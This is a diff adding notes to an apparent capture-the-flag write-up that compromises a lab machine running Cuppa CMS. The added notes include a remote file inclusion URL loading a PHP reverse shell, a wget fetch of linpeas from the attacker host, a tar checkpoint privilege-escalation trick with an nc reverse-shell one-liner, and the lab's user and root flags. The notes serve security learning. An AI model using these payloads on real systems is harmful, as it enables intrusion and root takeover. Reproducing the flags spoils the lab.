@@ -34,4 +34,34 @@
 	- go to new CMS URL found 
 	- name of hidden directory = **45kra24zxs28v3yd**
 	- name of vulnerability when you include a remote file for malicious purposes = **remote file inclusion**
-	- ... 
+	- run goBuster on hidden directory:
+		- `gobuster dir -u http://10.10.60.122/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+		- found "adminstrator" directory which is a login to Cuppa CMS
+	- use searchsploit to look for exploits:
+		- `searchsploit cuppa cms`
+		- found a RFI vulnerability in "[target]/alerts/alertConfigField.php?urlConfig=[RFI]"
+	- exploit RFI vulnerability
+		- create PHP reverse shell and host it on attacker machine
+		- navigate to shell via URL on target: `http://10.10.60.122/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.31.198:8080/shell.php`
+4. post-exploitation:
+	- stablise shell: `bash -i` -> `python -c 'import pty;pty.spawn("/bin/bash")'`
+	- find the user flag:
+		- `cd /home/milesdyson` -> `cat user.txt`
+		- user flag = **7ce5c2109a40f958099283600a9aae807**
+	- esclate privileges:
+		- load "linpeas.sh" onto system
+		- host on attack machine and on targert machine: `cd /var/www/html` -> `wget http://10.11.31.198:8080/linpeas.sh`
+		- run linpeas: `chmod u+x linpeas.sh` -> `./linpeas.sh`
+		- found "backup.sh" which can be run with root privileges 
+		- the file creates a backup of the "/var/www/html" directory, but uses tar wildcards (`*`) to do so, which means you can use checkpoint actions to execute commands
+		- setup reverse shell action to execute:
+			```bash
+			echo "rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc 10.11.31.198 4444 > /tmp/f" > shell.sh
+			touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+			touch "/var/www/html--checkpoint=1"
+			```
+		- setup netcat listener on attack machine: `nc -lvnp 4444`
+		- run the "backup.sh" script: `./home/milesdyson/backups/backup.sh`
+	- find root flag:
+		- `cd /root` -> `cat root.txt`
+		- root flag = **3f0372db24753accc7179a282cd6a949**
